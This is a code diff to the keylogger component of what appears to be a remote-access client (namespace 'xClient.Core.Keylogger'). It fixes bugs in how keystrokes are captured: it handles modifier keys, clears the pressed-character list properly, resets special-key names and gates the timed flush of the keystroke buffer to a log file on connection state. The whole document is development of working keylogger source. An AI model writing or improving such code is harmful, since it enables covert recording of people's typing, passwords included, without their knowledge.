@@ -139,7 +139,9 @@ namespace xClient.Core.Keylogger
                 if (!string.IsNullOrEmpty(filtered))
                 {
                     Debug.WriteLine("OnKeyPress Output: " + filtered);
-                    _ignoreSpecialKeys = true;
+                    if (_pressedKeys.IsModifierKeysSet())
+                        _ignoreSpecialKeys = true;
+
                     _pressedKeyChars.Add(e.KeyChar);
                     _logFileBuffer.Append(filtered);
                 }
@@ -149,8 +151,7 @@ namespace xClient.Core.Keylogger
         private void OnKeyUp(object sender, KeyEventArgs e) //Called third
         {
             _logFileBuffer.Append(HighlightSpecialKeys(_pressedKeys.ToArray()));
-            for (int i = 0; i < _pressedKeyChars.Count; i++)
-                _pressedKeyChars.RemoveAt(i);
+            _pressedKeyChars.Clear();
         }
 
         private string HighlightSpecialKeys(Keys[] keys)
@@ -167,6 +168,7 @@ namespace xClient.Core.Keylogger
                 }
                 else
                 {
+                    names[i] = string.Empty;
                     _pressedKeys.Remove(keys[i]);
                 }
             }
@@ -222,7 +224,7 @@ namespace xClient.Core.Keylogger
 
         private void timerFlush_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
         {
-            if (_logFileBuffer.Length > 0)
+            if (_logFileBuffer.Length > 0 && !SystemCore.Disconnect)
                 WriteFile();
         }
 
